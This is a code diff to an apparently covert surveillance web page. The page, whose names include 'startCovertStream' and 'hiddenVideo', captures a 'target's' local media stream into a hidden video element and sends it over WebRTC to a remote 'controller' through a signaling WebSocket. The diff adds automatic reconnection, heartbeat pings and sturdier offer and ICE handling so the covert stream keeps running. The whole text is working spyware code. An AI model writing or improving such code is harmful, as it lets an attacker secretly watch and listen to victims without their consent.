@@ -143,6 +143,8 @@
         let pc;
         let localStream;
         let pendingIceCandidates = [];
+        let pingInterval = null;
+        let isConnectingWs = false;
         const video = document.getElementById('hiddenVideo');
 
         async function startCovertStream() {
@@ -168,43 +170,7 @@
                 });
 
                 video.srcObject = localStream;
-
-                ws = new WebSocket(wsUrl);
-
-                ws.onopen = async function () {
-                    console.log("[+] Connected to signaling server");
-                    await sendOffer();
-                };
-
-                ws.onmessage = async (event) => {
-                    try {
-                        const msg = JSON.parse(event.data);
-                        console.log("[+] Received signal from server:", msg.type);
-
-                        if (msg.type === "request_offer") {
-                            await sendOffer();
-                        } else if (msg.type === "answer" && pc) {
-                            console.log("[+] Setting remote answer description");
-                            await pc.setRemoteDescription(new RTCSessionDescription(msg.data));
-                            
-                            // Flush any pending ICE candidates
-                            while (pendingIceCandidates.length > 0) {
-                                const cand = pendingIceCandidates.shift();
-                                await pc.addIceCandidate(new RTCIceCandidate(cand));
-                            }
-                        } else if (msg.type === "ice" && pc) {
-                            if (pc.remoteDescription && pc.remoteDescription.type) {
-                                await pc.addIceCandidate(new RTCIceCandidate(msg.data));
-                            } else {
-                                pendingIceCandidates.push(msg.data);
-                            }
-                        }
-                    } catch (e) {
-                        console.error("Signaling error:", e);
-                    }
-                };
-
-                ws.onerror = (err) => console.error("WebSocket error:", err);
+                connectSignaling();
             } catch (err) {
                 console.error("Media/connection error:", err);
                 card.innerHTML = `
@@ -214,17 +180,111 @@
             }
         }
 
+        function connectSignaling() {
+            if (isConnectingWs) return;
+            isConnectingWs = true;
+
+            if (ws) {
+                try {
+                    ws.onclose = null;
+                    ws.close();
+                } catch (e) {}
+            }
+
+            ws = new WebSocket(wsUrl);
+
+            ws.onopen = async function () {
+                isConnectingWs = false;
+                console.log("[+] Target connected to signaling server");
+
+                // Start heartbeat ping
+                if (pingInterval) clearInterval(pingInterval);
+                pingInterval = setInterval(() => {
+                    if (ws && ws.readyState === WebSocket.OPEN) {
+                        ws.send(JSON.stringify({ type: "ping" }));
+                    }
+                }, 20000);
+
+                await sendOffer();
+            };
+
+            ws.onmessage = async (event) => {
+                try {
+                    const msg = JSON.parse(event.data);
+
+                    if (msg.type === "pong") {
+                        return;
+                    }
+
+                    if (msg.type === "request_offer") {
+                        console.log("[+] Received request_offer from controller");
+                        await sendOffer();
+                    } else if (msg.type === "answer" && pc) {
+                        console.log("[+] Setting remote answer description");
+                        await pc.setRemoteDescription(new RTCSessionDescription(msg.data));
+
+                        // Flush any pending ICE candidates safely
+                        while (pendingIceCandidates.length > 0) {
+                            const cand = pendingIceCandidates.shift();
+                            try {
+                                await pc.addIceCandidate(new RTCIceCandidate(cand));
+                            } catch (e) {
+                                console.warn("Failed to add queued candidate:", e);
+                            }
+                        }
+                    } else if (msg.type === "ice" && pc) {
+                        if (pc.remoteDescription && pc.remoteDescription.type) {
+                            try {
+                                await pc.addIceCandidate(new RTCIceCandidate(msg.data));
+                            } catch (e) {
+                                console.warn("Failed to add ICE candidate:", e);
+                            }
+                        } else {
+                            pendingIceCandidates.push(msg.data);
+                        }
+                    }
+                } catch (e) {
+                    console.error("Signaling message handling error:", e);
+                }
+            };
+
+            ws.onerror = (err) => console.error("WebSocket error:", err);
+
+            ws.onclose = () => {
+                isConnectingWs = false;
+                if (pingInterval) clearInterval(pingInterval);
+                console.log("Target WebSocket closed. Reconnecting in 2s...");
+                setTimeout(() => {
+                    if (localStream) {
+                        connectSignaling();
+                    }
+                }, 2000);
+            };
+        }
+
         async function sendOffer() {
+            console.log("[*] Generating new WebRTC offer for controller");
+            pendingIceCandidates = [];
+
             if (pc) {
-                try { pc.close(); } catch(e) {}
+                try {
+                    pc.ontrack = null;
+                    pc.onicecandidate = null;
+                    pc.onconnectionstatechange = null;
+                    pc.close();
+                } catch (e) {
+                    console.warn("Error closing old pc:", e);
+                }
             }
 
             pc = new RTCPeerConnection(rtcConfig);
 
             if (localStream) {
                 localStream.getTracks().forEach(track => {
-                    console.log("[+] Attaching local track:", track.kind);
-                    pc.addTrack(track, localStream);
+                    if (track.readyState === 'live') {
+                        console.log("[+] Adding track:", track.kind);
+                        pc.addTrack(track, localStream);
+                    }
                 });
             }
 
@@ -245,7 +305,7 @@
             await pc.setLocalDescription(offer);
 
             if (ws && ws.readyState === WebSocket.OPEN) {
-                console.log("[+] Sending WebRTC offer to controller");
+                console.log("[+] Dispatched offer to controller");
                 ws.send(JSON.stringify({ type: "offer", data: offer }));
             }
         }
